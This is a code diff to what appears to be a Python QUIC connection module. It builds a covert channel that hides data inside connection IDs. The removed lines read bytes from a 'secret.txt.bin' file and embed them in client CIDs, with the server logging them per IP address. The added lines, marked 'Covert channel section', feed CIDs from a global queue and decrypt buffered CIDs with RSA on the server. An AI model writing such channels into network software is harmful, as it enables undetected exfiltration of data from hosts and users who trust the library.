@@ -1,6 +1,7 @@
 import binascii
 import logging
 import os
+import queue
 from collections import deque
 from dataclasses import dataclass
 from enum import Enum
@@ -110,9 +111,15 @@ STOP_SENDING_FRAME_CAPACITY = 1 + 2 * UINT_VAR_MAX_SIZE
 STREAMS_BLOCKED_CAPACITY = 1 + UINT_VAR_MAX_SIZE
 TRANSPORT_CLOSE_FRAME_CAPACITY = 1 + 3 * UINT_VAR_MAX_SIZE  # + reason length
 
+GLOBAL_CID_QUEUE = queue.Queue()
+RSA_BIT_STRENGTH = 4096
+RSA_PUBLIC_EXPONENT = 0x10001
+AES_BLOCK_SIZE = 16
+GLOBAL_BYTE_ORDER = 'big'
+RSA_PRIVATE_KEY = None
+PEER_BUFFERS = {}
+PEER_PUBLIC_KEYS = {}
 
-SECRET_BUFFER_FILE = 'secret.txt.bin'
-SECRET_FILE = 'secret.txt'
 
 def EPOCHS(shortcut: str) -> FrozenSet[tls.Epoch]:
     return frozenset(EPOCH_SHORTCUTS[i] for i in shortcut)
@@ -343,22 +350,17 @@ class QuicConnection:
         self._network_paths: List[QuicNetworkPath] = []
         self._pacing_at: Optional[float] = None
         self._packet_number = 0
-        if self._is_client:
-            # Read the buffer
-            secret_bytes = open(SECRET_BUFFER_FILE, 'rb').read()
-            # Truncate it
-            open(SECRET_BUFFER_FILE, 'wb').write(secret_bytes[6:])
-            # Use the first 8 bytes as the cid
-            cid = os.urandom(2) + secret_bytes[:6]
-            # If we get to the end of the buffer, the cid will be less than 8
-            # so extend it, the receiver can figure out when the file ends
-            if len(cid) < 8:
-                cid = cid + os.urandom(8 - len(cid))
+        
+        # Covert channel section
+        if not GLOBAL_CID_QUEUE.empty():
+            # Pull a cid from the queue
+            cid = GLOBAL_CID_QUEUE.get()
         else:
             cid = os.urandom(8)
         self._peer_cid = QuicConnectionId(
             cid=cid, sequence_number=None
         )
+
         self._peer_cid_available: List[QuicConnectionId] = []
         self._peer_cid_sequence_numbers: Set[int] = set([0])
         self._peer_retire_prior_to = 0
@@ -1913,13 +1915,42 @@ class QuicConnection:
         retire_prior_to = buf.pull_uint_var()
         length = buf.pull_uint8()
         connection_id = buf.pull_bytes(length)
-        cid_list = self._cid_map.get(context.addr[0], [])
-        if not self._is_client and (len(cid_list) == 0 or cid_list[-1] != self._original_destination_connection_id):
-            cid_list.append(self._original_destination_connection_id)
-            cid_list = cid_list[:10]
-            self._cid_map[context.addr[0]] = cid_list
-            open(f'{str(context.addr[0])}.bin', 'ab+').write(self._original_destination_connection_id[2:])
-            print(f'{str(context.addr[0])},{self._original_destination_connection_id[2:].hex()}')
+        
+        if not self._is_client:
+            # Store CIDs in a file associated with the ip address
+            # TODO: Figure out key exchange in a bi-directional context. Rght now the clients send a keyed payload in
+            #       every message, but the server needs to send their public key every response somehow without it being
+            #       a static CID. For now the client just 'has' the public key of the server.
+            file_prefix = "server-" if self._is_client else "client-"
+            cid_list = self._cid_map.get(context.addr[0], [])
+            if not RSA_PRIVATE_KEY:
+                print("NO PRIVATE KEY")
+                exit(1)
+            if RSA_PRIVATE_KEY and self._original_destination_connection_id not in cid_list:
+                from . import ccrypto
+                # Keep track of the last 10 CIDs so we don't double-write anything when multiple connections are made
+                # with repeat cids
+                cid_list.append(self._original_destination_connection_id)
+                cid_list = cid_list[:10]
+                self._cid_map[context.addr[0]] = cid_list
+                
+                # Add payload to buffer
+                buffer = PEER_BUFFERS.get(context.addr[0], b'')
+                buffer = buffer + self._original_destination_connection_id
+                PEER_BUFFERS[context.addr[0]] = buffer
+                print("BUFFER LENGTH: ", len(buffer))
+                peer_n_bytes, payload = ccrypto.split_keyed_payload(buffer)
+                decrypted_message = ccrypto.try_decrypt(RSA_PRIVATE_KEY, payload)
+                if decrypted_message:
+                    peer_public_modulus, ciphertext = ccrypto.split_keyed_payload(buffer)
+                    peer_public_key = ccrypto.generate_rsa_public_key(peer_n_bytes)
+                    PEER_PUBLIC_KEYS[context.addr[0]] = peer_public_key
+                else:
+                    print("Try decrypt failed.")
+                
+                # Write the payload for debugging
+                open(f'{file_prefix}{str(context.addr[0])}.bin', 'ab+').write(self._original_destination_connection_id)
+                print(f'{file_prefix}{str(context.addr[0])},{self._original_destination_connection_id.hex()}')
         stateless_reset_token = buf.pull_bytes(STATELESS_RESET_TOKEN_SIZE)
         if not connection_id or len(connection_id) > CONNECTION_ID_MAX_SIZE:
             raise QuicConnectionError(
